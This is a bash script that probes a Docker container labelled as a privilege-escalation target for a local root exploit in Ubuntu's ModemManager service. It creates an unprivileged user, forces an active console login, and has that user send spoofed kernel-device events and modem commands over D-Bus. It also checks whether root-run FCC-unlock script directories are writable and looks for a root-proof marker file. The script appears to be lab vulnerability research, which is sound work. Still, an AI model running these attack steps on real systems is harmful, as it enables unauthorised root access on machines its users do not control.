#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/modemmanager-active-methods.out"
target_work="/tmp/modemmanager-active-methods"

mkdir -p "$repo_dir/logs"

docker exec -i "$container" bash -s <<'ROOTSH'
set +e

WORK=/tmp/modemmanager-active-methods
OUT=$WORK/probe.out
MMLOG=$WORK/modemmanager.debug.log
MMPID=$WORK/modemmanager.pid
MARKER=/root/modemmanager_active_methods_root
USER=selfauth
TTYNUM=6
USER_PROBE=/home/$USER/modemmanager-active-methods-user.sh

rm -rf "$WORK" "$MARKER"
mkdir -m 1777 -p "$WORK"
: >"$OUT"
chmod 0666 "$OUT"

section() {
  printf '\n## %s\n' "$1" >>"$OUT"
}

run_root() {
  local label="$1"
  shift
  section "$label"
  printf '$ %s\n' "$*" >>"$OUT"
  "$@" >>"$OUT" 2>&1
  printf 'rc=%s\n' "$?" >>"$OUT"
}

cleanup_target() {
  set +e
  if [ -s "$MMPID" ]; then
    kill "$(cat "$MMPID")" >/dev/null 2>&1 || true
    sleep 1
    kill -9 "$(cat "$MMPID")" >/dev/null 2>&1 || true
  fi
  loginctl terminate-user "$USER" >/dev/null 2>&1 || true
  systemctl start "getty@tty${TTYNUM}.service" >/dev/null 2>&1 || true
  rm -f "/home/$USER/.bash_profile" "$USER_PROBE" "$WORK/ptyname"
  rm -f "$MARKER"
}
trap cleanup_target EXIT

if ! id "$USER" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$USER"
fi
echo "$USER:$USER" | chpasswd
usermod -G "$USER" "$USER"

section "target identity"
{
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id ubuntu 2>&1 || true
  id attacker 2>&1 || true
  id "$USER" 2>&1 || true
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    modemmanager dbus polkitd policykit-1 systemd udev 2>&1 | sort
} >>"$OUT" 2>&1

section "modemmanager policy defaults"
python3 - <<'PY' >>"$OUT" 2>&1
import xml.etree.ElementTree as ET
path = "/usr/share/polkit-1/actions/org.freedesktop.ModemManager1.policy"
root = ET.parse(path).getroot()
for action in root.findall("action"):
    aid = action.get("id")
    vals = {}
    for key in ("allow_any", "allow_inactive", "allow_active"):
        node = action.find("defaults/" + key)
        vals[key] = (node.text or "").strip() if node is not None else ""
    print(f"{aid}\tany={vals['allow_any']}\tinactive={vals['allow_inactive']}\tactive={vals['allow_active']}")
PY

section "dbus method allowlist"
{
  conf=/usr/share/dbus-1/system.d/org.freedesktop.ModemManager1.conf
  grep -n 'ReportKernelEvent\|InhibitDevice\|ScanDevices\|SetLogging\|Command\|CreateBearer\|FactoryReset\|CreateCall\|SendDtmf' "$conf" || true
  echo
  echo "ReportKernelEvent allow rule count:"
  grep -c 'send_member="ReportKernelEvent"' "$conf" || true
} >>"$OUT" 2>&1

section "default service reachability before manual daemon"
{
  systemctl show ModemManager.service \
    -p LoadState -p ActiveState -p SubState -p UnitFileState -p ConditionResult \
    -p ExecStart -p User -p CapabilityBoundingSet -p ProtectSystem -p ProtectHome \
    -p PrivateTmp -p NoNewPrivileges 2>&1
  cat /usr/share/dbus-1/system-services/org.freedesktop.ModemManager1.service 2>&1
  busctl --system list --no-pager | grep -E 'ModemManager|PolicyKit' || true
  timeout 8 busctl --system call org.freedesktop.ModemManager1 \
    /org/freedesktop/ModemManager1 org.freedesktop.DBus.Introspectable Introspect \
    >/tmp/modemmanager-active-methods/default-introspect.out 2>&1
  rc=$?
  sed -n '1,40p' /tmp/modemmanager-active-methods/default-introspect.out
  echo "default_introspect_rc=$rc"
  systemctl is-active ModemManager.service 2>&1 || true
} >>"$OUT" 2>&1

section "inactive selfauth pkcheck semantics"
runuser -u "$USER" -- bash -lc '
set +e
id
for action in \
  org.freedesktop.ModemManager1.Control \
  org.freedesktop.ModemManager1.Device.Control \
  org.freedesktop.ModemManager1.Contacts \
  org.freedesktop.ModemManager1.Messaging \
  org.freedesktop.ModemManager1.Voice \
  org.freedesktop.ModemManager1.Time \
  org.freedesktop.ModemManager1.Location \
  org.freedesktop.ModemManager1.USSD \
  org.freedesktop.ModemManager1.Firmware; do
    printf "### %s\n" "$action"
    timeout 5 pkcheck --action-id "$action" --process $$ 2>&1
    printf "rc=%s\n" "$?"
  done
' >>"$OUT" 2>&1

cat >"$USER_PROBE" <<'USERPROBE'
#!/bin/bash
set +e
WORK=/tmp/modemmanager-active-methods
OUT=$WORK/active-user.out
exec >"$OUT" 2>&1

echo "## active tty subject"
id
tty
printf 'XDG_SESSION_ID=%s\n' "${XDG_SESSION_ID:-}"
if [ -n "${XDG_SESSION_ID:-}" ]; then
  loginctl show-session "$XDG_SESSION_ID" \
    -p Id -p User -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote 2>&1
fi

echo
echo "## active selfauth pkcheck semantics"
for action in \
  org.freedesktop.ModemManager1.Control \
  org.freedesktop.ModemManager1.Device.Control \
  org.freedesktop.ModemManager1.Contacts \
  org.freedesktop.ModemManager1.Messaging \
  org.freedesktop.ModemManager1.Voice \
  org.freedesktop.ModemManager1.Time \
  org.freedesktop.ModemManager1.Location \
  org.freedesktop.ModemManager1.USSD \
  org.freedesktop.ModemManager1.Firmware; do
    printf "### %s\n" "$action"
    timeout 5 pkcheck --action-id "$action" --process $$ 2>&1
    printf "rc=%s\n" "$?"
done

if busctl --system list --no-pager | grep -q ':.*ModemManager'; then
  echo
  echo "## active method attempts with daemon present"
  timeout 8 mmcli -L
  echo "mmcli_list_rc=$?"
  timeout 8 mmcli -S
  echo "mmcli_scan_rc=$?"
  timeout 8 mmcli -G DEBUG
  echo "mmcli_set_logging_rc=$?"

  python3 - <<'PY' &
import os, pty, time
m, s = pty.openpty()
name = os.ttyname(s)
with open("/tmp/modemmanager-active-methods/ptyname", "w") as f:
    f.write(name)
time.sleep(12)
PY
  ptypid=$!
  sleep 1
  pty=$(cat "$WORK/ptyname" 2>/dev/null)
  echo "attacker_pty=$pty"
  base=${pty#/dev/}

  timeout 8 mmcli --report-kernel-event="action=add,subsystem=tty,name=ttyS0,uid=attacker-ttys0"
  echo "report_ttyS0_rc=$?"
  timeout 8 mmcli --report-kernel-event="action=add,subsystem=tty,name=$base,uid=attacker-pty"
  echo "report_pty_rc=$?"
  timeout 8 gdbus call --system --dest org.freedesktop.ModemManager1 \
    --object-path /org/freedesktop/ModemManager1/Modem/0 \
    --method org.freedesktop.ModemManager1.Modem.Command "AT" 3
  echo "fake_modem_command_rc=$?"
  kill "$ptypid" >/dev/null 2>&1 || true
else
  echo "ModemManager daemon absent for active method attempts"
fi
USERPROBE
chmod 0755 "$USER_PROBE"
chown "$USER:$USER" "$USER_PROBE"

cat >"/home/$USER/.bash_profile" <<USERPROFILE
$USER_PROBE
exit
USERPROFILE
chown "$USER:$USER" "/home/$USER/.bash_profile"

section "active selfauth tty policy probe"
{
  systemctl stop "getty@tty${TTYNUM}.service" >/dev/null 2>&1 || true
  timeout 45 openvt -c "$TTYNUM" -s -f -w -- /bin/login -f "$USER"
  echo "openvt_policy_rc=$?"
  sleep 1
  cat "$WORK/active-user.out" 2>&1 || true
} >>"$OUT" 2>&1

section "manual daemon semantic-only setup"
{
  if pidof ModemManager >/dev/null 2>&1; then
    echo "existing ModemManager pid(s): $(pidof ModemManager)"
  else
    /usr/sbin/ModemManager --debug >"$MMLOG" 2>&1 &
    echo "$!" >"$MMPID"
    for _ in $(seq 1 40); do
      busctl --system list --no-pager | grep -q ':.*ModemManager' && break
      sleep 0.25
    done
  fi
  echo "manual_pid=$(cat "$MMPID" 2>/dev/null || true)"
  busctl --system list --no-pager | grep -E 'ModemManager|PolicyKit' || true
  timeout 8 busctl --system introspect org.freedesktop.ModemManager1 \
    /org/freedesktop/ModemManager1 org.freedesktop.ModemManager1 --no-pager 2>&1 | sed -n '1,80p'
  echo "manager_introspect_rc=${PIPESTATUS[0]}"
  busctl --system tree org.freedesktop.ModemManager1 --list 2>&1 | sed -n '1,80p'
} >>"$OUT" 2>&1

section "active selfauth methods against manual daemon"
{
  rm -f "$WORK/active-user.out" "$WORK/ptyname"
  systemctl stop "getty@tty${TTYNUM}.service" >/dev/null 2>&1 || true
  timeout 60 openvt -c "$TTYNUM" -s -f -w -- /bin/login -f "$USER"
  echo "openvt_methods_rc=$?"
  sleep 2
  cat "$WORK/active-user.out" 2>&1 || true
  echo
  echo "object tree after active attempts:"
  busctl --system tree org.freedesktop.ModemManager1 --list 2>&1 | sed -n '1,120p'
} >>"$OUT" 2>&1

section "pseudo-device and root-consumed file/script gates"
{
  echo "candidate device nodes:"
  find /dev -maxdepth 2 \( -name 'ttyS*' -o -name 'ttyACM*' -o -name 'cdc-wdm*' -o -name 'wwan*' -o -path '/dev/pts/*' \) \
    -printf '%m %u:%g %p\n' 2>/dev/null | sort | sed -n '1,120p'
  echo
  echo "ModemManager writable/script directories:"
  find /etc/ModemManager /usr/share/ModemManager /usr/lib/aarch64-linux-gnu/ModemManager /var/lib/ModemManager \
    -maxdepth 2 -printf '%m %u:%g %y %p -> %l\n' 2>/dev/null | sort | sed -n '1,220p'
  echo
  echo "attacker write checks:"
  runuser -u "$USER" -- bash -c '
    for p in \
      /etc/ModemManager \
      /etc/ModemManager/fcc-unlock.d \
      /usr/share/ModemManager \
      /usr/share/ModemManager/fcc-unlock.available.d \
      /usr/share/ModemManager/fcc-unlock.available.d/105b \
      /usr/share/ModemManager/fcc-unlock.available.d/1199 \
      /usr/share/ModemManager/connection.available.d/99-log-event \
      /usr/lib/aarch64-linux-gnu/ModemManager/connection.d; do
        if [ -w "$p" ]; then echo "writable $p"; else echo "not_writable $p"; fi
    done'
} >>"$OUT" 2>&1

section "manual daemon debug excerpts"
grep -Ei 'ReportKernelEvent|kernel event|ttyS0|pts/|attacker|filtered|virtual device|platform driver|unauthor|denied|not authorized|dbus|fcc|unlock' "$MMLOG" 2>/dev/null \
  | sed -n '1,260p' >>"$OUT" 2>&1 || true

section "root marker and cleanup precheck"
{
  if [ -e "$MARKER" ]; then
    echo "ROOT_PROOF=yes"
    ls -l "$MARKER"
    cat "$MARKER"
  else
    echo "ROOT_PROOF=no"
    ls -l "$MARKER" 2>&1 || true
  fi
  systemctl is-system-running 2>&1 || true
  systemctl --failed --no-legend 2>&1 || true
} >>"$OUT" 2>&1

cleanup_target
trap - EXIT

section "cleanup verification"
{
  pidof ModemManager 2>&1 || true
  loginctl list-sessions --no-legend 2>&1 | grep "$USER" || true
  ls -l "$MARKER" 2>&1 || true
  systemctl is-system-running 2>&1 || true
  systemctl --failed --no-legend 2>&1 || true
} >>"$OUT" 2>&1
ROOTSH

docker exec "$container" cat "$target_work/probe.out" > "$log_path"
docker exec "$container" rm -rf "$target_work"
sed -n '1,420p' "$log_path"
